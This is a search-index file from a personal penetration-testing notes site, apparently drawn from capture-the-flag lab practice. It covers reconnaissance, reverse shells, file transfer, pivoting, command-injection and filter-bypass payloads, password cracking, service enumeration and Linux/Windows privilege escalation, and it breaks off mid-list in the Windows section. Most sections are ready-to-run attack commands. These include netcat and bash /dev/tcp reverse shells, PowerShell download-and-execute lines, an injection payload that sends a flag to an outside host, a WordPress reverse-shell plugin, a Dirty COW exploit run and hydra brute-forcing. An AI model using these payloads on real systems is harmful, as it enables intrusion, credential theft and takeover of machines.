load_search_index({"pages":[{"title":"WildfootW Cybersecurity Note","text":"","tags":"","url":"index.html"},{"title":"Reconnaissance","text":"Reconnaissance Table of Contents Reconnaissance tags: Security Recon Reference Workflow Tools Passive Information Gathering Search Engine Google hacking Asset identification Email Harvesting Tools Active Information Gathering DNS enumeration Port Scanning Scan for UDP Fingerprint Scanning Vulnerability Scanning AWS S3 buckets tags: Security Recon Reference Workflow Recon workflow cheatsheets Tools OWASP Amass: DNS Scraping Certificates APIs Web Archives Passive Information Gathering Search Engine Google hacking Google hacking database Asset identification Shodan Censys Email Harvesting theHarvester: Gathers emails, names, subdomains, IPs, and URLs theharvester -d cisco.com -b google Tools recon-ng whois Sublist3r: Fast subdomains enumeration tool Active Information Gathering @|\u2b50\u6383\u63cf cheat sheet|Hakluke\u2019s Ultimate OSCP Guide DNS enumeration tools - DNSRecon example: brute force reverse zone dnsrecon -n 10.10.10.83 -r 10.0.0.0\/8 --db olympus.db dnsrecon -n 10.10.10.83 -r 172.16.0.0\/12 --db olympus.db dnsrecon -n 10.10.10.83 -r 192.168.0.0\/16 --db olympus.db brute force subdomain tools - knock reverse lookup brute force - \u53cd\u67e5 ip A zone transfer can be requested by specifying a type of AXFR dig axfr @10.10.10.83 olympus.htb DNS Zone Transfer - \u507d\u88dd\u6210 slave DNS # get dns server list host -t ns megacorpone.com | cut -d &quot; &quot; -f 4 # require DNS zone host -l {{domain name}} {{dns server address}} host -l megacorpone.com ns2.megacorpone.com #!\/bin\/bash # Simple Zone Transfer Bash Script # $1 is the first argument given after the bash script # Check if argument was given, if not, print usage if [ -z &quot;$1&quot; ]; then echo &quot;[*] Simple Zone transfer script&quot; echo &quot;[*] Usage : $0 &lt;domain name&gt; &quot; exit 0 fi # if argument was given, identify the DNS servers for the domain for server in $(host -t ns $1 |cut -d&quot; &quot; -f4);do # For each of these servers, attempt a zone transfer host -l $1 $server |grep &quot;has address&quot; done Port Scanning TCP \u958b\u555f\uff0c\u56de\u8986 SYN-ACK \u5c01\u5305 UDP \u9001\u51fa\u7a7a\u7684 UDP \u5305 \u958b\u555f\uff0c\u6c92\u6709\u56de\u8986 \u95dc\u9589\uff0c\u56de\u8986 ICMP unreachable SNMP - onesixtyone Tools nmap Masccan Scan for UDP nmap -sU 10.11.1.X unicornscan -mU -v -I 10.11.1.X Fingerprint Scanning lbd - Load balancer detector Netcraft [website] Vulnerability Scanning Nmap OpenVAS (Nessus) AWS S3 buckets \u679a\u8209 Bucket Name S3Scanner grayhatwarfare: Public buckets by grayhatwarfare","tags":"","url":"Pentest_Misc_Knowledge\/Reconnaissance.html"},{"title":"Using Public Exploits","text":"Using Public Exploits Table of Contents Using Public Exploits tags: Security Searching Exploits Exploit Explanation Using Exploit Tools searchsploit tags: Security Searching Exploits Exploit Database SecurityFocus Exploit Explanation comics explanation - xkcd Google: heartbleed xkcd Using Exploit for i in $(seq 0 100); do python heartbleed.py valentine.htb; done Tools searchsploit searchsploit -o windows smb -o, --overflow [Term] Exploit titles are allowed to overflow their columns. searchsploit -m 17491 -m, --mirror [EDB-ID] Mirror (aka copies) an exploit to the current working directory.","tags":"","url":"Pentest_Misc_Knowledge\/Using_Public_Exploits.html"},{"title":"Reverse Shell","text":"Reverse Shell Table of Contents Reverse Shell tags: Security ReverseShell Move Payload to Target Download from HTTPS Server Spawn Reverse Shell Online Resource Cheat Sheet netcat (really reliable) with ssl bash mknod telnet php powershell Spwning fully interactive TTY Shell Online Resource Overview Steps Cheat Sheet Python perl ruby lua From within IRB From within vi From within nmap Other Tips rlwrap Getting Xterm shell tags: Security ReverseShell Move Payload to Target Download from HTTPS Server wget --no-check-certificate wildfoo.tw\/reverse_shell -O \/tmp\/s sh \/tmp\/s Spawn Reverse Shell Online Resource 7 linux shells using built in tools Pentestmonkey - Reverse Shell Cheat Sheet Cheat Sheet netcat (really reliable) rm \/tmp\/f;mkfifo \/tmp\/f;cat \/tmp\/f|\/bin\/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;\/tmp\/f ncat -lk -n -v 7777 with ssl Target: ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl Attacker: ncat -v 10.0.0.22 4444 --ssl bash bash -i &gt;&amp; \/dev\/tcp\/127.0.0.1\/8787 0&gt;&amp;1 exec 5&lt;&gt;\/dev\/tcp\/127.0.0.1\/8787; cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done mknod if GAPING_SECURITY_HOLE = disabled mknod backpipe p &amp;&amp; nc 10.10.14.207 7777 0&lt;backpipe | \/bin\/bash 1&gt;backpipe telnet mknod backpipe p &amp;&amp; telnet 10.10.14.207 7777 0&lt;backpipe | \/bin\/bash php \/usr\/share\/laudanum\/php\/php-reverse-shell.php powershell nishang\/Shells cp \/usr\/share\/nishang\/Shells\/Invoke-PowerShellTcp.ps1 reverse.ps1 vim reverse.ps1 : copy : .EXAMPLE : PS &gt; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444 : to end of file and edit ip and port and delete 'PS &gt; ' python3 -m http.server 80 powershell IEX(New-Object Net.WebClient).downloadstring(&quot;http:\/\/10.10.14.42\/reverse.ps1&quot;) sometimes we need use \\&quot; to escape Spwning fully interactive TTY Shell Online Resource NETSEC - Spawning TTY Shell cheat sheet Overview \u901a\u5e38\u62ff\u5230\u7684 reverse shell \u6703\u6709\u4e00\u4e9b\u554f\u984c Some commands, like su and ssh require a proper terminal to run STDERR usually isn\u2019t displayed Can\u2019t properly use text editors like vim No tab-complete No up arrow history No job control Upgrading simple shells to fully interactive TTYs Steps use bash ncat -lk -n -v 7777 and get shell type python -c 'import pty; pty.spawn(&quot;\/bin\/bash&quot;)' in reverse shell Ctrl-Z type stty raw -echo fg &lt;enter&gt; &lt;enter&gt; export TERM=xterm allow us use Ctrl-l to clean the screen Cheat Sheet Python python -c 'import pty; pty.spawn(&quot;\/bin\/sh&quot;)' echo os.system('\/bin\/bash') \/bin\/sh -i perl perl -e 'exec &quot;\/bin\/sh&quot;;' exec &quot;\/bin\/sh&quot;; ruby exec &quot;\/bin\/sh&quot; lua os.execute('\/bin\/sh') From within IRB exec &quot;\/bin\/sh&quot; From within vi :!bash :set shell=\/bin\/bash:shell From within nmap !sh Other Tips rlwrap Getting Xterm shell Make sure your Xserver is listening to TCP: $ netstat -lntup Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID tcp 0 0 0.0.0.0:6000 0.0.0.0:* LISTEN - tcp6 0 0 :::6000 :::* LISTEN - New Xserver versions have tcp listening disabled by default. Consult your distro how to enable it. You may have to change your display manager settings or the xserverrc file, e.g.: $ cat \/etc\/X11\/xinit\/xserverrc #!\/bin\/sh if [ -z &quot;$XDG_VTNR&quot; ]; then exec \/usr\/bin\/X -listen tcp &quot;$@&quot; else exec \/usr\/bin\/X -listen tcp &quot;$@&quot; vt$XDG_VTNR fi Then all you have to do is to allow incoming connections from the specific IP: $ xhost +10.10.10.69 Now let\u2019s connect: \/usr\/bin\/xterm -display 10.10.15.203:0 or DISPLAY=10.10.15.203:0 \/usr\/bin\/xterm","tags":"","url":"Pentest_Misc_Knowledge\/Reverse_Shell.html"},{"title":"File Transfer","text":"File Transfers Table of Contents File Transfers tags: Security Reference Unix netcat http - put python3 http.server nginx Powershell Invoke-WebRuquest upoad - with put method download run sciprt tags: Security Reference offsecnewbie Unix netcat Receiver ncat -l -n -v 90 &gt; simpler.py Sender cat simpler.py | nc 10.10.14.207 90 Ctrl-c http - put python3 http.server Sender: upload - with put method curl --upload-file TEST.txt --url http:\/\/192.168.8.9\/TEST.txt --http1.0 Receiver: http.server with put method wget https:\/\/github.com\/WildfootW\/Security-utility-Scripts\/blob\/master\/Network_Protocol\/http.server_with-put.py python3 http.server_with-put.py 80 nginx Receiver server { listen 8001 default_server; server_name wildfootw; location \/ { root \/var\/www\/upload; dav_methods PUT; } } Sender curl --upload-file captured.cap 10.10.14.14:8001 Powershell SANS blog Invoke-WebRuquest upoad - with put method $FilePath = &quot;.\\TEST.txt&quot; $uri = &quot;http:\/\/192.168.8.9\/TEST.txt&quot; Invoke-WebRequest -uri $uri -Method Put -Infile $FilePath -ContentType 'text\/plain' download Invoke-WebRequest -Uri &quot;http:\/\/10.10.14.42\/wmic_info.bat&quot; -OutFile wmic_info.bat run sciprt powershell IEX(New-Object Net.WebClient).downloadstring(&quot;http:\/\/10.10.14.42\/reverse.ps1&quot;) maybe you need use \\&quot; to escape","tags":"","url":"Pentest_Misc_Knowledge\/File_Transfer.html"},{"title":"Pivoting (Port Fun)","text":"Pivoting (Port Fun) Table of Contents Pivoting (Port Fun) tags: Security Pivoting Reference Example nc &lt;== telnet \/bin\/bash telnet ==&gt; nc A:9000 &lt;== ssh ==&gt; C:80 local:1080 socks5 &lt;== ssh 10.10.10.75 ==&gt; any temp tags: Security Pivoting Reference NETSEC - Dynamic Port Forwarding(SSH) HighOn.Coffee - SSH &amp; Meterpreter Pivoting Techique Example nc &lt;== telnet \/bin\/bash telnet ==&gt; nc Machine A: nc -lk -n -v 7777 Machine B: telnet A.A.A.A 7777 | \/bin\/bash | telnet B.B.B.B 7777 Machine C: nc -lk -n -v 7777 A:9000 &lt;== ssh ==&gt; C:80 Machine A: ssh -i ~\/.ssh\/B.root.key -L9000:C.C.C.C:80 B.B.B.B or ssh B.B.B.B &lt;enter&gt; &lt;enter&gt; ~C ssh&gt; -L 9000:C.C.C.C:80 local:1080 socks5 &lt;== ssh 10.10.10.75 ==&gt; any ssh -D1080 10.10.10.75 netstat -alnp | grep LIST | grep 1080 vim \/etc\/proxychains.conf : [ProxyList] : # add proxy here ... : # meanwile : # defaults set to &quot;tor&quot; : #socks4 127.0.0.1 9050 : # metasploit : #socks4 127.0.0.1 1080 : # ssh : socks5 127.0.0.1 1080 proxychains curl -k https:\/\/10.10.10.60 temp Note: FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP] FPipe.exe -l 80 -r 80 -s 80 192.168.1.7 Note: ssh -[L\/R] [local port]:[remote ip]:[remote port] [local user]@[local ip] ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port Note: mknod backpipe p ; nc -l -p [remote port] &lt; backpipe | nc [local IP] [local port] &gt;backpipe mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.5.5.151 80 &gt;backpipe # Port Relay mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe # Proxy (Port 80 to 8080) mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow &amp; 1&gt;backpipe # Proxy monitor (Port 80 to 8080) Is tunnelling possible? Send commands locally, remotely ssh -D 127.0.0.1:9050 -N [username]@[ip] proxychains ifconfig","tags":"","url":"Pentest_Misc_Knowledge\/Pivoting_(Port_Fun).html"},{"title":"Wireless Secuirty","text":"Wireless Security Table of Contents Wireless Security tags: Security Wireless WiFi Cracking CAP file Using Aircrack-ng Using hashcat Decrypt CAP tags: Security Wireless WiFi Cracking CAP file Using Aircrack-ng aircrack-ng captured.cap -w rockyou.txt Using hashcat git clone https:\/\/github.com\/hashcat\/hashcat-utils make .\/cap2hccapx.bin captured.cap captured.hccapx .\/hashcat -m 2500 hashes\/captured.hccapx \/opt\/wordlist\/rockyou.txt Decrypt CAP Wireshark - Preferences - IEEE 802.11 - Decryption Keys - +","tags":"","url":"Pentest_Misc_Knowledge\/Wireless_Secuirty.html"},{"title":"Command Injection & WAF Bypass & Fuzzing","text":"Command Injection &amp; WAF bypass &amp; Fuzzing Table of Contents Command Injection &amp; WAF bypass &amp; Fuzzing tags: Security Fuzzing Command Injection Cheatsheet keywords Regular expression String Concat Empty Variable Environment Variable String operating Backslash &lt;space&gt; characters ${IFS} Redirecting bash WAF bypass &amp; Fuzz Enum path Enum option Enum bad char Example tags: Security Fuzzing &amp; ; - ` | $ Command Injection Cheatsheet GitHub - payloadbox | cat flag &amp;&amp; cat flag ; cat flag %0a cat flag &quot;; cat flag `cat flag` cat $(ls) &quot;; cat $(ls) `cat flag | nc wildfoo.tw 7778` . flag PS1=$(cat flag) `echo${IFS}${PATH}|cut${IFS}-c1-1` =&gt; \/ keywords Regular expression ? match one character cat fl?g \/???\/??t \/???\/p??s?? * match multiple characters cat f* cat f?a* String Concat A=fl;B=ag;cat $A$B Empty Variable cat fl${x}ag cat tes$(z)t\/flag Environment Variable use env to print out environment variables $PATH =&gt; &quot;\/usr\/local\/\u2026.blablabla\u201d ${PATH:0:1} =&gt; '\/' ${PATH:1:1} =&gt; 'u' ${PATH:0:4} =&gt; '\/usr' ${PS2} &gt; ${PS4} + String operating Empty String cat fl&quot;&quot;ag cat fl''ag cat &quot;fl&quot;&quot;ag&quot; Backslash c\\at fl\\ag &lt;space&gt; characters ${IFS} cat${IFS}flag ls$IFS-alh cat$IFS$2flag Redirecting cat&lt;\/etc\/passwd bash {cat,\/etc\/passwd} X=$'cat\\x20\/etc\/passwd'&amp;&amp;$X IFS=,;`cat&lt;&lt;&lt;uname,-a` WAF bypass &amp; Fuzz Enum path gobuster -u http:\/\/fluxcapacitor.htb -w \/usr\/share\/wordlists\/dirbuster\/directory-list-lowercase-2.3-medium.txt Enum option wfuzz --hh BBB -H &quot;User-Agent:alamot&quot; -c -z file,\/usr\/share\/SecLists\/Discovery\/Web-Content\/burp-parameter-names.txt http:\/\/10.10.10.69\/sync\/?FUZZ{not_this}=test wfuzz -c -w \/usr\/share\/wordlists\/dirbuster\/directory-list-2.3-medium.txt -H &quot;User-Agent: nothingtoseehere&quot; --hh=19 &quot;http:\/\/fluxcapacitor.htb\/sync?FUZZ=test&quot; https:\/\/bitvijays.github.io\/LFC-VulnerableMachines.html#parameter-fuzz Enum bad char wfuzz -c -w \/usr\/share\/wordlists\/SecLists\/Fuzzing\/special_chars.txt -u http:\/\/10.10.10.69\/sync?opt=FUZZ Example opt=' pw''d' opt=' whi''ch cu''rl' opt=' \/usr\/bin\/whi[c]h mk\\nod' opt=' p\\s aux'","tags":"","url":"Misc_Attack_Vector_Knowledge\/Command_Injection_WAF_Bypass_Fuzzing.html"},{"title":"Password Attacks","text":"Password Attacks Main Table of Contents Password Attacks Main tags: security PasswordAttack Hash Identify hash-identifier Wordlist crunch Cracker hashcat CheatSheet Find Hash Type Crack hydra John the Ripper CrackMapExec Others mimikatz tags: security PasswordAttack Hash Identify hash-identifier GitHub Wordlist \/usr\/share\/wordlist \/usr\/share\/wfuzz\/wordlist \/usr\/share\/golismero\/wordlist \/usr\/share\/dirb\/wordlist crunch \u7522\u5b57\u5178\u6a94 Cracker hashcat CheatSheet -a [Attack Modes] hashcat -a 0 -m 0 example0.hash example.dict -r rules\/best64.rule hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a Find Hash Type hashcat --example-hashes | grep -A 2 -B 1 MySQL MODE: 200 TYPE: MySQL323 HASH: 7196759210defdc0 PASS: hashcat -- MODE: 300 TYPE: MySQL4.1\/MySQL5 HASH: fcf7c1b8749cf99d88e5f34271d636178fb5d130 PASS: hashcat Crack .\\hashcat64.exe -m 300 Z:\\temporary_share\\mysql.DBadmin ..\\rockyou.txt 2d2b7a5e4e637b8fba1d17f40318f277d29964d0:imissyou hydra Very fast network logon cracker FTP\u3001HTTP\u3001HTTPS\u3001MySQL\u3001MS SQL\u3001Oracle\u3001Cisco\u3001IMAP\u3001VNC &lt;form method=&quot;POST&quot; action=&quot;http:\/\/192.168.23.43\/october\/backend\/backend\/auth\/signin&quot; accept-charset=&quot;UTF-8&quot;&gt;&lt;input name=&quot;_session_key&quot; type=&quot;hidden&quot; value=&quot;ycAQqg2iO9JcC5htu7hAQfjuU5O40woSuzFToJru&quot;&gt;&lt;input name=&quot;_token&quot; type=&quot;hidden&quot; value=&quot;DVnX6bPdshG2fTBv15ziHFCinYUGwzoXXLWYa2cS&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;postback&quot; value=&quot;1&quot; \/&gt; _session_key=QK2TDe7JBjSXtMe7BsB5LIvu1olwJ9DligCAGb9b&amp;_token=tapg9kGUfJGIRgmeO8i8THMgVlFouvl5Ipsah0Oc&amp;postback=1&amp;login=fyodor&amp;password=AAAA SESSIONKEY=$(curl -s &quot;http:\/\/192.168.23.43\/october\/backend\/backend\/auth\/signin&quot; | grep &quot;POST&quot; | tee post_form | awk -F 'value=' '{print $2}' | awk -F '&quot;' '{print $2}') CSRF=$(cat post_form | awk -F 'value=' '{print $3}' | awk -F '&quot;' '{print $2}') hydra -l fyodor -P \/usr\/share\/wordlists\/rockyou.txt 192.168.23.43 http-post-form &quot;\/october\/backend\/backend\/auth\/signin:_session_key=${SESSIONKEY}&amp;_token=${CSRF}&amp;postback=1&amp;login=^USER^&amp;password=^PASS^:F=did not match&quot; python3 script: https:\/\/www.youtube.com\/watch?v=d2nVDoVr0jE hydra -L users.txt -P passwords.txt ssh:\/\/10.10.10.184 John the Ripper CrackMapExec crackmapexec smb 10.10.10.184 -u users.txt -p passwords.txt Others mimikatz Windows - Password stealing","tags":"","url":"Misc_Attack_Vector_Knowledge\/Password_Attacks.html"},{"title":"Client-Side Attacks","text":"","tags":"","url":"Misc_Attack_Vector_Knowledge\/Client_Side_Attacks.html"},{"title":"Social Engineering Attacks","text":"","tags":"","url":"Misc_Attack_Vector_Knowledge\/Social_Engineering_Attacks.html"},{"title":"Misc Services","text":"Misc Services Enumeration &amp; Attack Table of Contents Misc Services Enumeration &amp; Attack tags: Security Recon MSSQL SSL MSSQL Get NTLMv2-SSP Hash SSL\/TLS SSLyze tags: Security Recon MSSQL SSL MSSQL Use impacket python script as client python3 mssqlclient.py reporting@10.10.10.125 -windows-auth Get NTLMv2-SSP Hash SQL&gt; xp_dirtree &quot;\\\\10.10.14.42\\WildfootW\\&quot; Then we can get Hash in Responder SSL\/TLS SSLyze GitHub SSL\/TLS server scanning sslyze --heartbleed valentine.htb","tags":"","url":"Misc_Service_Attack\/Misc_Services.html"},{"title":"Misc Web CMS","text":"Misc Web Content Management Framework Security Table of Contents Misc Web Content Management Framework Security tags: Security CMS WordPress Joomla ContentManagementFramework WordPress Reverse Shell Tools WPScan Joomla tags: Security CMS WordPress Joomla ContentManagementFramework WordPress Reverse Shell WordPress Plugin WordPress Plugin : Reverse Shell revsh-plugin.php &lt;?php \/** * Plugin Name: Reverse Shell Plugin * Plugin URI: * Description: Reverse Shell Plugin * Version: 1.0 * Author: Vince Matteo * Author URI: http:\/\/www.sevenlayers.com *\/ exec(&quot;\/bin\/bash -c 'bash -i &gt;&amp; \/dev\/tcp\/10.10.14.12\/7701 0&gt;&amp;1'&quot;); ?&gt; zip revsh-plugin.zip revsh-plugin.php Tools login page: http:\/\/example.tw\/wp-login.php WPScan API token --api-token XXX ~\/.wpscan\/scan.yml Recon wpscan --url http:\/\/example.tw --enumerate [OPTS] Password Attack wpscan --url http:\/\/example.tw --usernames &quot;william.riker&quot; --passwords .\/password_list Joomla login page: http:\/\/example.tw\/administrator\/","tags":"","url":"Misc_Service_Attack\/Misc_Web_CMS.html"},{"title":"SMB & SAMBA","text":"SMB\/SAMBA Enumeration &amp; Attacks Table of Contents SMB\/SAMBA Enumeration &amp; Attacks tags: Security Recon SMB SAMBA Reference General Tools nbtscan nmap NSE scripts enum4linux nmblookup smbclient (null session) rpcclient (111\/135) Metasploit SMB auxiliary scanners mount tags: Security Recon SMB SAMBA Reference Mad Irish - Hacking Windows shares from Linux with Samba SANS - Plundering Windows Account Info via Authenticated SMB Sessions General smbclient -U '' -L \/\/10.10.10.184 smbclient -U 'guest' -L \/\/10.10.10.184 smbclient -U 'anonymous' -L \/\/10.10.10.184 Tools nbtscan nbtscan -r 10.11.1.0\/24 nmap NSE scripts ls -l \/usr\/share\/nmap\/scripts\/smb* nmap -p 139, 445 --script=smb-os-discovery {{target ip}} nmap -p 139, 445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 {{target ip}} enum4linux It is written in Perl and is basically a wrapper around the Samba tools smbclient, rpcclient, net and nmblookup enum4linux -a 10.11.1.227 nmblookup nmblookup -A {{target ip}} Appendix C: Known NetBIOS Suffix Values [name] [suffix] - [group] [node type] [ACTIVE] [PERMANENT] HPB4B52F0559C2 &lt;00&gt; - B &lt;ACTIVE&gt; &lt;PERMANENT&gt; MSHOME &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; &lt;PERMANENT&gt; HPB4B52F0559C2 &lt;20&gt; - B &lt;ACTIVE&gt; &lt;PERMANENT&gt; HP0559C2 &lt;00&gt; - B &lt;ACTIVE&gt; &lt;PERMANENT&gt; HP0559C2 &lt;20&gt; - B &lt;ACTIVE&gt; &lt;PERMANENT&gt; smbclient (null session) smbclient -L {{netbios name}} -I {{target ip}} -U {{username}} smbclient \/\/{{server}}\/{{service}} -I {{target ip}} -U {{username}} rpcclient (111\/135) Metasploit SMB auxiliary scanners SCANNER SMB AUXILIARY MODULES mount mkdir \/mnt\/smb mount -t cifs -o username=guest \/\/10.10.10.134\/Backups \/mnt\/smb","tags":"","url":"Misc_Service_Attack\/SMB_SAMBA.html"},{"title":"SNMP","text":"SNMP Enumeration Table of Contents SNMP Enumeration tags: Security Recon SNMP Tools nmap onesixtyone (Fast SNMP Scanner) snmpwalk Enyx tags: Security Recon SNMP Tools nmap nmap -sU --open -p 161 10.11.1.1-254 -oG mega-snmp.txt find SNMP on UDP port nmap -sU -sC -oA nmap.udp.log 10.10.10.20 nmap -sU -sC -n -p 161 -oA udp 10.10.10.20 onesixtyone (Fast SNMP Scanner) onesixtyone 10.10.10.0\/24 public snmpwalk Tool - snmpwalk -v2c -c public 10.10.10.20 iso.3.6.1.2.1.4.34.1.3.1.4 iso.3.6.1.2.1.4.34.1.3.2.16 Getting SNMP MIBs Installed and Configured apt install snmp-mibs-downloader vim \/etc\/snmp\/snmp.conf # Enumerating the Entire MIB Tree snmpwalk -c public -v1 10.11.1.219 # Enumerating Windows Users snmpwalk -c public -v1 10.11.1.204 1.3.6.1.4.1.77.1.2.25 # Enumerating Running Windows Processes snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.4.2.1.2 # Enumerating Open TCP Ports snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.6.13.1.3 # Enumerating Installed Software snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.6.3.1.2 cat snmpwalk.log | grep IP-FORWARD-MIB::inetCidrRouteIfIndex.ipv6 IP-FORWARD-MIB::inetCidrRouteIfIndex.ipv6.&quot;de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:c9:36&quot;.128.3.0.0.7.ipv6.&quot;00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00&quot; = INTEGER: 1 Enyx Tool - Enyx - SNMPv6 Enumeration via Python","tags":"","url":"Misc_Service_Attack\/SNMP.html"},{"title":"SMTP","text":"","tags":"","url":"Misc_Service_Attack\/SMTP.html"},{"title":"Linux","text":"Privilege Escalation Linux Table of Contents Privilege Escalation Linux tags: Security PrivilegeEscalation Reference Information Gathering Script Manual Operating System Distribution Kernel Version Environmental Variables Users \/ Groups Applications &amp; Services &amp; Files Networking Confidential Information File Systems Privilege Escalation Dirty Cow Tools GTFOBins example: systemctl tags: Security PrivilegeEscalation Reference Rebootuser - Local Linux Enumeration &amp; Privilege Escalation Cheat Sheet linuxprivchecker.py \u2013 a Linux Privilege Escalation Check Script mzet-\/linux-exploit-suggester lucyoa\/kernel-exploits Information Gathering Cheat Sheet - Linux|g0tm1lk - Linux Privilege Escalation Script cp \/opt\/Privilege_Escalation\/LinEnum\/LinEnum.sh . python3 -m http.server 80 hype@Valentine:~$ curl 10.10.14.2\/LinEnum.sh | bash Manual Operating System Distribution cat \/etc\/issue cat \/etc\/*-release cat \/etc\/lsb-release # Debian based cat \/etc\/redhat-release # Redhat based Kernel Version cat \/proc\/version uname -a uname -mrs Environmental Variables Users \/ Groups id who sudo -l \/ sudo -ll # If no command is specified, list the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host. www-data@jarvis:\/$ sudo -l Matching Defaults entries for www-data on jarvis: env_reset, mail_badpass, secure_path=\/usr\/local\/sbin\\:\/usr\/local\/bin\\:\/usr\/sbin\\:\/usr\/bin\\:\/sbin\\:\/bin User www-data may run the following commands on jarvis: (pepper : ALL) NOPASSWD: \/var\/www\/Admin-Utilities\/simpler.py sudo -u pepper \/var\/www\/Admin-Utilities\/simpler.py -p Run the command as a user other than the default target user (usually root). The user may be either a user name or a numeric user-ID (UID) prefixed with the \u2018#\u2019 character (e.g., #0 for UID 0). example: in lxd group: create virtual machine and mount root folder Applications &amp; Services &amp; Files ps aux | grep root ps -ef | grep root cat \/etc\/services # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here. find \/ -perm -1000 -type d 2&gt;\/dev\/null # SGID (chmod 2000) - run as the group, not the user who started it. find \/ -perm -g=s -type f 2&gt;\/dev\/null # = -perm -2000 # SUID (chmod 4000) - run as the owner, not the user who started it. find \/ -perm -u=s -type f 2&gt;\/dev\/null # = -perm -4000 # SGID or SUID find \/ -perm -g=s -o -perm -u=s -type f 2&gt;\/dev\/null # Quicker search. Looks in 'common' places: \/bin, \/sbin, \/usr\/bin, \/usr\/sbin, \/usr\/local\/bin, \/usr\/local\/sbin and any other *bin, for SGID or SUID for i in `locate -r \"bin$\"`; do find $i \\( -perm -4000 -o -perm -2000 \\) -type f 2&gt;\/dev\/null; done # find starting at root (\/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied) find \/ -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2&gt;\/dev\/null -exec ls -la {} \\; Networking Confidential Information File Systems Privilege Escalation Dirty Cow Race condition in mm\/gup.c in the Linux kernel 2.x through 4.x before 4.8.3 wget https:\/\/raw.githubusercontent.com\/FireFart\/dirtycow\/master\/dirty.c hype@Valentine:~$ wget 10.10.14.2\/dirtycow.c hype@Valentine:~$ grep gcc dirty.c \/\/ gcc -pthread dirty.c -o dirty -lcrypt hype@Valentine:~$ gcc -pthread dirty.c -o dirty -lcrypt hype@Valentine:~$ .\/dirty \/etc\/passwd successfully backed up to \/tmp\/passwd.bak Please enter the new password: Complete line: firefart:figsoZwws4Zu6:0:0:pwned:\/root:\/bin\/bash mmap: 7fbb000ab000 hype@Valentine:~$ su firefart Password: firefart@Valentine:\/home\/hype# id uid=0(firefart) gid=0(root) groups=0(root) Tools GTFOBins GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. example: systemctl find \/ -perm -4000 2&gt;\/dev\/null pepper@jarvis:\/$ find \/ -perm -4000 -ls 2&gt;\/dev\/null ... 1312201 172 -rwsr-x--- 1 root pepper 174520 Feb 17 2019 \/bin\/systemctl ... search systemctl in GTFOBins. It said: sudo sh -c 'cp $(which systemctl) .; chmod +s .\/systemctl' TF=$(mktemp).service echo '[Service] Type=oneshot ExecStart=\/bin\/sh -c &quot;id &gt; \/tmp\/output&quot; [Install] WantedBy=multi-user.target' &gt; $TF .\/systemctl link $TF .\/systemctl enable --now $TF So I create a file wildfootw.service &amp; reverse_shell.sh in \/home\/pepper in wildfootw.service: [Service] Type=oneshot ExecStart=\/bin\/bash \/home\/pepper\/reverse_shell.sh [Install] WantedBy=multi-user.target in reverse_shell.sh: bash -i &gt;&amp; \/dev\/tcp\/10.10.14.207\/7779 0&gt;&amp;1 systemctl link \/home\/pepper\/wildfootw.service systemctl start wildfootw.service","tags":"","url":"Privilege_Escalation\/Linux.html"},{"title":"Windows","text":"Privilege Escalation Windows Table of Contents Privilege Escalation Windows tags: Security PrivilegeEscalation Reference Tools Windows services Service Control sc Net Permission Accesschk cacls PsExec JuicyPotato Information Gathering Scripts PowerSploit\/Privesc Windows Management Instrumentation Command-Line Manual OS users and permissions network interfaces &amp; routing table &amp; firewall scheduled tasks, running processes, started services and installed drivers. last Privilege Escalation kernel \u6f0f\u6d1e sysprep \/ Unattend Groups.xml - Group Policy Preference saved passwords AlwaysInstallElevated DLL Command Injection pingback check nc tags: Security PrivilegeEscalation Reference \ud83c\udf1fWindows \u63d0\u6b0a | FuzzySecurity - Windows Privilege Escalation Fundamentals Windows explotion suggester &amp; compiled exp Windows Privilege Escalation Vectors (\u4e2d\u6587) pentestmonkey\/windows-privesc-check PayloadsAllTheThings \u2500 Windows - Privilege Escalation Tools Windows services Microsoft\u2019s Sysinternals Suite \u7b2c\u4e00\u6b21\u7528 Sysinternal \u7684\u5de5\u5177\u90fd\u6703\u8df3\u51fa GUI \u540c\u610f\u4f7f\u7528\u8005\u689d\u6b3e\uff0c\u53ef\u4ee5\u52a0\u5165 \/accepteula \u53c3\u6578\u7565\u904e\u9019\u500b\u6b65\u9a5f\u3002 Service Control sc sc can query, configure and manage windows services. C:\\&gt; sc qc {{Service name: Spooler}} C:\\&gt; sc config upnphost binpath= &quot;C:\\nc.exe -nv 127.0.0.1 9988 -e C:\\WINDOWS\\System32\\cmd.exe&quot; C:\\&gt; sc config upnphost obj= &quot;.\\LocalSystem&quot; password= &quot;&quot; Net C:\\&gt; net start upnphost Permission Accesschk A tool in Sysinternals Suite -u Suppress errors. -c Name is a Windows Service -v Verbose (includes Windows Vista Integrity Level). -w Show only objects that have write access. -d Only process directories or top level key. -s Recurse. C:\\&gt; accesschk.exe -ucqv {{Service name: Spooler}} C:\\&gt; accesschk.exe -ucqv * # see all the permissions # &quot;Authenticated Users&quot;, &quot;Power Users&quot; etc your user group C:\\&gt; accesschk.exe -uwcqv &quot;Authenticated Users&quot; * # Find all weak folder 